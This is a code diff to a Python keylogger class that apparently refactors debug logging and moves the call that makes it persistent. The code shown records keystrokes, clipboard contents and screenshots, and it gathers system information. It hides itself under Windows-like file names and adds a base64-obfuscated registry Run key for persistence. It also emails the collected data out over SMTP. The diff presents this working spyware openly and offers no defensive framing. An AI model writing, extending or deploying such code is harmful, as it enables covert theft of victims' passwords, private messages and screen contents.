@@ -39,13 +39,11 @@ class KeyLogger:
 
     def __init__(self, interval, email, password):
 
-        self.become_persistent()
         self.log = 'KeyLogger started\n'
 
         self.interval = interval
         self.email = email
         self.password = password
-        self.print_debug_logs = False
 
         self.msg_to_be_sent_later = ''
         self.clipboard = ''
@@ -61,13 +59,15 @@ class KeyLogger:
         self._KEYS_INFO = 'EXPLORER_LOG.txt'  # Name of the file having keylogs
         self._SYSTEM_INFO = 'READ_ME.txt'  # Name of the file having system info
         self._SS_FOLDER_NAME = 'Windows_SS' # Name of the SS folder
+        self.PRINT_DEBUG_LOGS = False
 
         self.files_to_encrypt = [os.path.join(self._FILE_PATH, self._KEYS_INFO), os.path.join(self._FILE_PATH, self._SYSTEM_INFO)]
 
     def start(self, print_debug_logs=False):
-        self.print_debug_logs = print_debug_logs
-        if self.print_debug_logs:
+        self.PRINT_DEBUG_LOGS = print_debug_logs
+        if self.PRINT_DEBUG_LOGS:
             print('[+] Keylogger Started')
+        self.become_persistent()
         key_listener = pk.Listener(on_press=self.process_key_press)
         with key_listener:
             self.report()
@@ -75,7 +75,7 @@ class KeyLogger:
 
     def become_persistent(self):
         try:
-            if self.print_debug_logs:
+            if self.PRINT_DEBUG_LOGS:
                 print('[+] Making the keylogger persistent')
             file_location = os.path.join(self._FILE_PATH, 'WindowsExplorer.exe')
 
@@ -84,9 +84,11 @@ class KeyLogger:
                 command = 'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"'
                 command = base64.b64encode(command.encode()).decode()
                 subprocess.call(base64.b64decode(command.encode()).decode(), shell=True)
+                if self.PRINT_DEBUG_LOGS:
+                    print('[+] Successfully made the keylogger persistent')
                     
         except Exception as e:
-            if self.print_debug_logs:
+            if self.PRINT_DEBUG_LOGS:
                 print(f'[-] Error while making persistent: {e}')
             pass
 
@@ -112,7 +114,7 @@ class KeyLogger:
             else:
                 current_key = ' <' + str(key) + '> '
         
-        if self.print_debug_logs:
+        if self.PRINT_DEBUG_LOGS:
             print(f'[+] Logging key {current_key}')
 
         self.log += current_key
@@ -129,14 +131,14 @@ class KeyLogger:
 
         path = os.path.join(self._FILE_PATH, self._KEYS_INFO)
         with open(path, 'w') as f:
-            if self.print_debug_logs:
+            if self.PRINT_DEBUG_LOGS:
                 print('[+] Writing keylogs to file')
             f.write(msg)
         self.log = ''
 
     def attach_file(self, msg, filename):
-        if self.print_debug_logs:
-            print(f'[+] Attaching message: {msg} to file: {filename}')
+        if self.PRINT_DEBUG_LOGS:
+            print(f'[+] Attaching file: {filename}')
         path = os.path.join(self._FILE_PATH, filename)
         if os.path.exists(path):
             with open(path, 'rb') as attachment:
@@ -148,7 +150,7 @@ class KeyLogger:
             msg.attach(p)
 
     def copy_clipboard(self):
-        if self.print_debug_logs:
+        if self.PRINT_DEBUG_LOGS:
             print('[+] Copying the content of clipboard')
         try:
             win32clipboard.OpenClipboard()
@@ -162,14 +164,14 @@ class KeyLogger:
         try:
             ss_folder_path = os.path.join(self._FILE_PATH, self._SS_FOLDER_NAME)
             if not os.path.exists(ss_folder_path):
-                if self.print_debug_logs:
+                if self.PRINT_DEBUG_LOGS:
                     print(f'[+] Creating folder {ss_folder_path}')
                 os.mkdir(ss_folder_path)
             self._SS_INFO = f"windows('{datetime.now()}').png"
             self._SS_INFO = self._SS_INFO.replace(':', '-')
             img = ImageGrab.grab()
 
-            if self.print_debug_logs:
+            if self.PRINT_DEBUG_LOGS:
                 print('[+] Taking screenshot')
 
             path = os.path.join(ss_folder_path, self._SS_INFO)
@@ -177,12 +179,12 @@ class KeyLogger:
             self.screenshot_list.append(self._SS_INFO)
             self.screenshot_error = ''
         except Exception as e:
-            if self.print_debug_logs:
+            if self.PRINT_DEBUG_LOGS:
                 print(f'[-] Error while taking screenshot: {e}')
             self.screenshot_error = f"\nScreenshot Error! Failed to take the screenshot: {str(e)}\n"
 
     def computer_info(self):
-        if self.print_debug_logs:
+        if self.PRINT_DEBUG_LOGS:
             print('[+] Retrieving system information')
         fetch_info(os.path.join(self._FILE_PATH, self._SYSTEM_INFO))
 
@@ -205,11 +207,11 @@ class KeyLogger:
             ss_folder_path = os.path.join(self._FILE_PATH, self._SS_FOLDER_NAME)
             if os.path.exists(ss_folder_path):
                 try:
-                    if self.print_debug_logs:
+                    if self.PRINT_DEBUG_LOGS:
                         print(f'[-] Removing foler {ss_folder_path}')
                     shutil.rmtree(ss_folder_path)
                 except Exception as e:
-                    if self.print_debug_logs:
+                    if self.PRINT_DEBUG_LOGS:
                         print(f'[-] Error removing folder {ss_folder_path}: {e}')
                     pass
 
@@ -218,12 +220,12 @@ class KeyLogger:
             s.login(email, password)
             text = msg.as_string()
 
-            if self.print_debug_logs:
+            if self.PRINT_DEBUG_LOGS:
                 print(f'[+] Sending mail to {email}')
 
             s.sendmail(email, email, text)
 
-            if self.print_debug_logs:
+            if self.PRINT_DEBUG_LOGS:
                 print(f'[+] Successfully sent mail to {email}')
 
             s.quit()
@@ -232,12 +234,12 @@ class KeyLogger:
             self.ss_deleteKey_count = 0
 
         except smtplib.SMTPException as e:
-            if self.print_debug_logs:
+            if self.PRINT_DEBUG_LOGS:
                 print(f'[-] Error sending mail: {e}')
             pass
 
         except socket.gaierror as e:
-            if self.print_debug_logs:
+            if self.PRINT_DEBUG_LOGS:
                 print(f'[-] Error sending mail: {e}')
             with open(os.path.join(self._FILE_PATH, self._KEYS_INFO), 'r') as f:
                 data = f.read()
@@ -246,7 +248,7 @@ class KeyLogger:
 
 
     def report(self):
-        if self.print_debug_logs:
+        if self.PRINT_DEBUG_LOGS:
             print('[+] Calling report function')
         self.copy_clipboard()
         self.screenshot()
